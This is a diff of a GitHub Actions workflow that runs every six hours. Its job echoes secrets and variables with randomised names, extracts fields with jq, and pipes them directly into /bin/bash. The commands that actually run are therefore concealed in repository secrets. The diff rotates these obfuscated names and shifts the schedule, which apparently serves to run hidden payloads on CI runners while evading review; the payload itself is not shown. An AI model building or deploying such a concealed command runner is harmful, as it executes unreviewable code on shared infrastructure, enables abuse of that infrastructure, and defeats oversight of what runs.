@@ -3,8 +3,7 @@ name: pengqi19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
-
+    - cron: '28 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengqi19871010
         env:
-          xhul2449: ${{ secrets.xhul2449 }}
+          nzqe2766: ${{ secrets.nzqe2766 }}
         run: |
-          echo $xhul2449 | jq -r .wup45653 | /bin/bash
-          echo $hquxw767 | jq -r .gp88 | /bin/bash
-          echo $ixf39737 | jq -r .neo8563 | /bin/bash
-          echo $rmu07 | jq -r .gmtz19727 | /bin/bash
-          echo $qa9615 | jq -r .lrltc17283 | /bin/bash
-          echo $pihoo83696 | jq -r .s37013 | /bin/bash
-          echo $lt55 | jq -r .vw88188 | /bin/bash
-          echo $weza75 | jq -r .xeswa9622 | /bin/bash
-          echo $x801 | jq -r .kgu3098 | /bin/bash
-          echo $z7540 | jq -r .rd3 | /bin/bash
-          echo $ja88349 | jq -r .wt76 | /bin/bash
+          echo $nzqe2766 | jq -r .hofu7528 | /bin/bash
+          echo $cd2 | jq -r .xymln44715 | /bin/bash
+          echo $seikq54 | jq -r .aa99872 | /bin/bash
+          echo $du346 | jq -r .ksu525 | /bin/bash
+          echo $ir10 | jq -r .tpz802 | /bin/bash
+          echo $wz90 | jq -r .diiye78 | /bin/bash
+          echo $lnai93810 | jq -r .surc16 | /bin/bash
+          echo $ui9759 | jq -r .ygxp268 | /bin/bash
 
